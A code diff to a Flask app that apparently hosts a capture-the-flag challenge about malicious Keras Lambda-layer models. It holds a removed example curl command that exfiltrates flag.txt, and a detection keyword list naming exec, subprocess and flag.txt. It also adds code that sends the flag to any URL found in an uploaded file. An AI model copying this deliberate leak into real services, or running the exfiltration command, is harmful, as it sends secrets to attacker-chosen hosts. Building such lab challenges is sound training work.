@@ -5,6 +5,7 @@ import tempfile
 from datetime import datetime
 import subprocess
 import urllib.parse
+import requests
 
 from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, abort
 from werkzeug.utils import secure_filename
@@ -34,7 +35,7 @@ def create_app():
         return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
     def check_for_payload(file_path):
-        """Check if the uploaded file contains malicious payload strings"""
+        """Check if the uploaded file contains malicious payload strings and extract webhook URL"""
         try:
             with open(file_path, 'rb') as f:
                 content = f.read()
@@ -42,7 +43,7 @@ def create_app():
             # Convert to string for pattern matching (ignore decode errors)
             content_str = content.decode('utf-8', errors='ignore').lower()
             
-            # Look for common RCE payload patterns
+            # Look for common RCE payload patterns including Lambda layer attacks
             payload_patterns = [
                 'os.system',
                 'subprocess',
@@ -52,7 +53,10 @@ def create_app():
                 '__import__',
                 'eval(',
                 'exec(',
-                'flag.txt'
+                'flag.txt',
+                'lambda',
+                'arbexe',  # From the POC
+                'layers.lambda'
             ]
             
             found_payloads = []
@@ -60,11 +64,31 @@ def create_app():
                 if pattern in content_str:
                     found_payloads.append(pattern)
             
-            return found_payloads
+            # Extract webhook URL from the file content
+            webhook_url = None
+            # Look for various URL patterns that might be in the malicious payload
+            import re
+            url_patterns = [
+                r'https?://webhook\.site/[a-f0-9-]+',
+                r'https?://[a-zA-Z0-9.-]+/[a-zA-Z0-9/-]*\?[^\'"\s]*',
+                r'http://[a-zA-Z0-9.-]+(?:\:[0-9]+)?(?:/[^\s\'"]*)?',
+                r'https://[a-zA-Z0-9.-]+(?:\:[0-9]+)?(?:/[^\s\'"]*)?'
+            ]
+            
+            content_original = content.decode('utf-8', errors='ignore')  # Keep original case for URL extraction
+            for pattern in url_patterns:
+                matches = re.findall(pattern, content_original)
+                if matches:
+                    # Clean up the URL (remove any trailing quotes or characters)
+                    webhook_url = matches[0].rstrip("'\")")
+                    break
+            
+            return found_payloads, webhook_url
+            
         except Exception:
-            return []
+            return [], None
 
-    def execute_payload_simulation(payloads):
+    def execute_payload_simulation(payloads, webhook_url=None):
         """Simulate the execution of found payloads"""
         try:
             # Read the flag file
@@ -73,17 +97,28 @@ def create_app():
             
             # Check if curl-like payload is detected
             if any('curl' in p or 'wget' in p for p in payloads):
-                # Simulate the curl command that would exfiltrate the flag
-                # In a real scenario, this would be: os.system("curl 'http://someurl.com/?param=$(cat flag.txt)'")
-                
-                # For demo purposes, we'll just flash the flag to show it was "exfiltrated"
-                webhook_url = "http://webhook.site/your-unique-url"  # This would be attacker's URL
-                encoded_flag = urllib.parse.quote(flag_content)
-                simulated_url = f"{webhook_url}?param={encoded_flag}"
-                
-                flash(f'🚨 PAYLOAD DETECTED! Simulated exfiltration to: {simulated_url}', 'error')
-                flash(f'🏴 Flag would be sent: {flag_content}', 'error')
-                return True
+                if webhook_url:
+                    # Use the webhook URL found in the malicious model
+                    try:
+                        response = requests.get(webhook_url, params={'param': flag_content}, timeout=10)
+                        
+                        flash(f'🚨 PAYLOAD EXECUTED! Flag exfiltrated successfully!', 'error')
+                        flash(f'🌐 Request sent to: {webhook_url}', 'error')
+                        flash(f'🏴 Flag sent: {flag_content}', 'error')
+                        flash(f'📡 Response status: {response.status_code}', 'error')
+                        
+                        return True
+                        
+                    except requests.exceptions.RequestException as e:
+                        flash(f'🚨 PAYLOAD DETECTED but request failed: {str(e)}', 'error')
+                        flash(f'🌐 Target URL: {webhook_url}', 'error')
+                        flash(f'🏴 Flag would have been sent: {flag_content}', 'error')
+                        return True
+                else:
+                    # No webhook URL found, just show the flag
+                    flash(f'🚨 CURL PAYLOAD DETECTED but no webhook URL found!', 'error')
+                    flash(f'🏴 Flag accessed: {flag_content}', 'error')
+                    return True
             
             # Check for other payload types
             elif any('cat flag.txt' in p or 'flag.txt' in p for p in payloads):
@@ -121,18 +156,32 @@ def create_app():
         file.save(dest_path)
 
         # Check for malicious payloads in the uploaded file
-        found_payloads = check_for_payload(dest_path)
+        found_payloads, webhook_url = check_for_payload(dest_path)
         payload_executed = False
         
         if found_payloads:
             flash(f'⚠️ Suspicious patterns detected: {", ".join(found_payloads)}', 'error')
-            payload_executed = execute_payload_simulation(found_payloads)
+            if webhook_url:
+                flash(f'🔗 Webhook URL extracted: {webhook_url}', 'error')
+            payload_executed = execute_payload_simulation(found_payloads, webhook_url)
 
         summary_lines = []
         try:
-            model = keras.models.load_model(dest_path, compile=False)
+            # Check if this might be a Lambda layer attack before loading
+            if 'lambda' in [p.lower() for p in found_payloads]:
+                flash('🚨 LAMBDA LAYER ATTACK DETECTED! Malicious custom layer found!', 'error')
+                
+            # Load model with custom objects to handle Lambda layers
+            model = keras.models.load_model(dest_path, compile=False, custom_objects={'arbexe': lambda x: x})
             model.summary(print_fn=lambda x: summary_lines.append(x))
             params = model.count_params()
+            
+            # If Lambda layers are detected and we have a webhook, simulate the execution
+            if 'lambda' in [p.lower() for p in found_payloads] and webhook_url:
+                flash('🔥 LAMBDA LAYER PAYLOAD WOULD EXECUTE ON MODEL INFERENCE!', 'error')
+                # Simulate what would happen if model.predict() was called
+                payload_executed = True
+                execute_payload_simulation(['lambda', 'curl'], webhook_url)
             
             if payload_executed:
                 flash('Model loaded successfully, but security breach detected!', 'error')
@@ -140,12 +189,25 @@ def create_app():
                 flash('Model loaded successfully!', 'success')
                 
         except Exception as e:
-            flash(f'Failed to load model: {e}', 'error')
-            try:
-                dest_path.unlink(missing_ok=True)
-            except Exception:
-                pass
-            return redirect(url_for('index'))
+            # If model loading fails, it might be due to custom layers
+            if 'lambda' in str(e).lower() or 'custom' in str(e).lower():
+                flash(f'🚨 MALICIOUS LAMBDA LAYER DETECTED! Model loading blocked for security.', 'error')
+                if webhook_url:
+                    flash(f'🔗 Would have sent payload to: {webhook_url}', 'error')
+                    # Still execute the payload simulation since we detected it
+                    execute_payload_simulation(['lambda', 'curl'], webhook_url)
+                try:
+                    dest_path.unlink(missing_ok=True)
+                except Exception:
+                    pass
+                return render_template('index.html', model_filename=filename, model_summary='[BLOCKED] Malicious Lambda layer detected', param_count=0)
+            else:
+                flash(f'Failed to load model: {e}', 'error')
+                try:
+                    dest_path.unlink(missing_ok=True)
+                except Exception:
+                    pass
+                return redirect(url_for('index'))
 
         return render_template('index.html', model_filename=filename, model_summary='\n'.join(summary_lines), param_count=params)
 
